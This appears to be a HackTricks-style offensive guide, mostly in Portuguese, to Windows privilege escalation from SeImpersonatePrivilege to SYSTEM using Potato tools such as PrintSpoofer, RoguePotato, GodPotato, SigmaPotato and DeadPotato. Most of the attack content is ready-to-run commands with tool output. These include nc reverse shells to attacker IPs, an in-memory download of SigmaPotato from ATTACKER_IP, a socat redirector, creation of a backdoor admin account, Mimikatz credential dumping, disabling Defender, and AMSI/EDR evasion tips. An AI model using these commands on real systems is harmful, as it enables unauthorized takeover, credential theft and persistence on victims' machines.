# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato não funciona** no Windows Server 2019 e Windows 10 build 1809 em diante. Entretanto, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** podem ser usados para **alavancar os mesmos privilégios e obter acesso com nível `NT AUTHORITY\SYSTEM`**. Este [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) aprofunda a ferramenta `PrintSpoofer`, que pode ser usada para abusar de impersonation privileges em hosts Windows 10 e Server 2019 onde o JuicyPotato não funciona mais.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos e armadilhas comuns

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Verifique os privilégios rapidamente:
```cmd
whoami /priv | findstr /i impersonate
```
- Se sua shell roda sob um token restrito sem SeImpersonatePrivilege (comum para Local Service/Network Service em alguns contextos), recupere os privilégios padrão da conta usando FullPowers, e então execute um Potato. Exemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer precisa do serviço Print Spooler em execução e acessível pelo endpoint RPC local (spoolss). Em ambientes hardenizados onde o Spooler foi desativado após o PrintNightmare, prefira RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requer um OXID resolver acessível em TCP/135. Se o egress estiver bloqueado, use um redirector/port-forwarder (veja exemplo abaixo). Builds mais antigas precisavam da flag -f.
- EfsPotato/SharpEfsPotato abusam do MS-EFSR; se um pipe estiver bloqueado, tente pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
- Erro 0x6d3 durante RpcBindingSetAuthInfo normalmente indica um serviço de autenticação RPC desconhecido/não suportado; tente um pipe/transporte diferente ou verifique se o serviço alvo está em execução.
- Forks “kitchen-sink” como DeadPotato empacotam módulos de payload extras (Mimikatz/SharpHound/Defender off) que tocam o disco; espere maior detecção por EDR comparado aos originais mais enxutos.

## Demonstração Rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Você pode usar -i para abrir um processo interativo no console atual, ou -c para executar um one-liner.
- Requer o serviço Spooler. Se estiver desativado, isso falhará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se o tráfego de saída na porta 135 estiver bloqueado, pivot o OXID resolver via socat no seu redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato é um primitive de abuso COM mais recente lançado no final de 2022 que mira o serviço **PrintNotify** em vez do Spooler/BITS. O binário instancia o servidor COM PrintNotify, injeta um `IUnknown` falso e então aciona um callback privilegiado através de `CreatePointerMoniker`. Quando o serviço PrintNotify (rodando como **SYSTEM**) se conecta de volta, o processo duplica o token retornado e inicia o payload fornecido com privilégios totais.

Notas operacionais principais:

* Funciona no Windows 10/11 e Windows Server 2012–2022 desde que o serviço Print Workflow/PrintNotify esteja instalado (está presente mesmo quando o Spooler legado está desativado após o PrintNightmare).
* Requer que o contexto de chamada possua **SeImpersonatePrivilege** (típico para IIS APPPOOL, MSSQL e contas de serviço de tarefas agendadas).
* Aceita um comando direto ou um modo interativo para que você possa permanecer dentro do console original. Exemplo:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Como é puramente baseado em COM, não são necessários listeners de named-pipe nem redirecionadores externos, tornando-o um substituto direto em hosts onde o Defender bloqueia o binding RPC do RoguePotato.

Operadores como Ink Dragon disparam o PrintNotifyPotato imediatamente após obter ViewState RCE no SharePoint para pivotar do worker `w3wp.exe` para SYSTEM antes de instalar o ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Dica: Se um pipe falhar ou o EDR bloqueá-lo, tente os outros pipes suportados:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Funciona no Windows 8/8.1–11 e Server 2012–2022 quando SeImpersonatePrivilege está presente.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornece duas variantes que miram objetos DCOM de serviço que têm RPC_C_IMP_LEVEL_IMPERSONATE por padrão. Compile ou use os binários fornecidos e execute seu comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork do GodPotato atualizado)

SigmaPotato adiciona melhorias modernas como execução in-memory via .NET reflection e um helper de reverse shell em PowerShell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Flag de reverse shell integrada `--revshell` e remoção do limite de 1024 caracteres do PowerShell para que você possa disparar payloads longos que contornam AMSI de uma só vez.
- Sintaxe amigável a Reflection (`[SigmaPotato]::Main()`), além de um truque rudimentar de evasão de AV via `VirtualAllocExNuma()` para confundir heurísticas simples.
- `SigmaPotatoCore.exe` separado compilado contra .NET 2.0 para ambientes PowerShell Core.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato mantém a cadeia de impersonação OXID/DCOM do GodPotato, mas incorpora auxiliares de pós-exploração para que operadores possam imediatamente assumir SYSTEM e realizar persistência/coleção sem ferramentas adicionais.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — executa comando arbitrário como SYSTEM.
- `-rev <ip:port>` — quick reverse shell.
- `-newadmin user:pass` — cria um administrador local para persistência.
- `-mimi sam|lsa|all` — drop and run Mimikatz para extrair credenciais (grava no disco, muito ruidoso).
- `-sharphound` — executa coleta do SharpHound como SYSTEM.
- `-defender off` — desativa a proteção em tempo real do Defender (muito ruidoso).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Como ele inclui binários extras, espere mais alertas de AV/EDR; use o GodPotato/SigmaPotato, mais enxuto, quando a furtividade for importante.

## Referências

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
